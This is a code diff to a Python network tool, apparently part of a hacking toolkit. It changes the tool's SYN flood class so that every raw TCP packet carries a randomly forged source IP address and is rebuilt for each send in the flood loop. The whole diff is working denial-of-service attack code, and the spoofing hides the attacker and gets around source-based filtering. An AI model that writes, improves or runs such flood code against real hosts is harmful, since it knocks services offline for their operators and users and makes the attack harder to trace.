@@ -6,6 +6,7 @@ import binascii
 import argparse
 import platform
 import datetime
+import random
 import time
 import sys
 import ssl
@@ -239,10 +240,11 @@ class Sniff :
 
 class DoS_SYN :
     def __init__(self, host, port, rate) :
-        self.host = host
+        self.host = socket.gethostbyname(host)
         self.port = int(port) if not isinstance(port, int) else port
         self.rate = int(rate) if not isinstance(rate, int) else rate
         self.socket_protocol = socket.IPPROTO_TCP if platform.system() != "Windows" else socket.IPPROTO_IP
+        self.randip = str()
         self.symbol = chr(9608)
 
     def __ip_header(self, version = 4, ihl = 5, tos = 0, 
@@ -250,8 +252,9 @@ class DoS_SYN :
                 ttl = 255, proto = socket.IPPROTO_TCP, csum = 0) :
         ihl_version = (version << 4) + ihl
         flags_offset = (flags << 13) + offset
-        src = socket.inet_pton(socket.AF_INET, socket.gethostbyname(socket.gethostname()))
-        dest = socket.inet_pton(socket.AF_INET, socket.gethostbyname(self.host))
+        self.randip = self.__random_ip()
+        src = socket.inet_pton(socket.AF_INET, self.randip)
+        dest = socket.inet_pton(socket.AF_INET, self.host)
         packet = struct.pack("BBHHHBBH4s4s", ihl_version, tos, tlen, iden, 
                         flags_offset, ttl, proto, csum, src, dest)
         return packet
@@ -266,8 +269,8 @@ class DoS_SYN :
         return packet
 
     def __pseudo_header(self, reserved = 0, proto = socket.IPPROTO_TCP, tcplen = 0) :
-        src = socket.inet_pton(socket.AF_INET, socket.gethostbyname(socket.gethostname()))
-        dest = socket.inet_pton(socket.AF_INET, socket.gethostbyname(self.host))
+        src = socket.inet_pton(socket.AF_INET, self.randip)
+        dest = socket.inet_pton(socket.AF_INET, self.host)
         packet = struct.pack("4s4sBBH", src, dest, reserved, proto, tcplen)
         return packet
         
@@ -279,6 +282,10 @@ class DoS_SYN :
         checksum = (checksum >> 16) + (checksum & 0xffff)
         checksum = (~checksum) & 0xffff
         return checksum
+
+    def __random_ip(self) :
+        sections = [str(random.randint(1, 255)) for _ in range(0, 4)]
+        return ".".join(sections)
 
     def __prepare(self) :
         ip_header = self.__ip_header()
@@ -310,9 +317,9 @@ class DoS_SYN :
             self.rate += 1
         section = self.rate // 32
         constant = section
-        payload = self.__prepare()
         try :
             for i in range(1, self.rate + 1) :
+                payload = self.__prepare()
                 with socket.socket(socket.AF_INET, socket.SOCK_RAW, self.socket_protocol) as flood :
                     flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                     flood.sendto(payload, (self.host, self.port))
